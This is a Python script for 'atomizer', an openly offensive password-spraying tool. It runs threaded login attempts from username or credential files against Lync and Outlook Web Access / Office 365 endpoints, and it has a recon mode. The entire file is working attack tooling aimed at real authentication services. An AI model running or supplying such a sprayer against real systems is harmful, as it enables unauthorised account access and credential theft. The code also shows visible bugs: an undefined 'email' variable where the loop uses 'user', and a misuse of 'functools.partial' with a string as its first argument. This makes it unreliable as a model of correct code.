#! /bin/env python3

"""
Usage:
    atomizer (lync|owa) <target> <password> --userfile USERFILE [--threads THREADS] [--debug]
    atomizer (lync|owa) <target> --csvfile CSVFILE [--threads THREADS] [--debug]
    atomizer (lync|owa) <target> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    target     target domain or url
    password   password to spray

Options:
    -h, --help               show this screen
    -v, --version            show version
    -u, --userfile USERFILE  file containing usernames (one per line)
    -c, --csvfile CSVFILE    csv file containing usernames and passwords
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
    --recon                  only collect info, don't password spray
"""

import logging
import signal
import asyncio
import concurrent.futures
import sys
import csv
from functools import partial
from pathlib import Path
from docopt import docopt
from core.utils.messages import *
from core.sprayers import Lync, OWA


class Atomizer:
    def __init__(self, loop, target, threads=3, debug=False):
        self.loop = loop
        self.target = target
        self.sprayer = None
        self.threads = int(threads)
        self.debug = debug

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    def lync(self):
        self.sprayer = Lync(
            target=self.target
        )

    def owa(self):
        self.sprayer = OWA(
            target=self.target
        )

    async def atomize(self, inputfile, password=None):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        with open(inputfile) as ifile:
            if inputfile.endswith('.csv') and not password:
                reader = csv.DictReader(ifile)
                log.debug('creating executor tasks from csv file')

                blocking_tasks = [
                    self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, partial(row['Email Address'], row['Password']))
                    for row in reader
                ]

            else:
                log.debug('creating executor tasks')
                blocking_tasks = [
                    self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, partial(email.strip(), password))
                    for user in ifile
                ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    def shutdown(self):
        self.sprayer.shutdown()


if __name__ == "__main__":
    args = docopt(__doc__, version="0.0.1dev")
    print(args)
    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        target=args['<target>'].lower(),
        threads=args['--threads'],
        debug=args['--debug']
    )

    if args['lync']:
        atomizer.lync()
    elif args['owa']:
        atomizer.owa()

    if not args['--recon']:
        inputfile = Path(args['--userfile'] if args['--userfile'] else args['--csvfile'])
        if not inputfile.exists() or not inputfile.is_file():
            print_bad("Path to --userfile/--csvfile invalid!")
            sys.exit(1)

        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, atomizer.shutdown)

        loop.run_until_complete(
            atomizer.atomize(
                inputfile=args['--userfile'] if args['--userfile'] else args['--csvfile'],
                password=args['<password>']
            )
        )
        atomizer.shutdown()
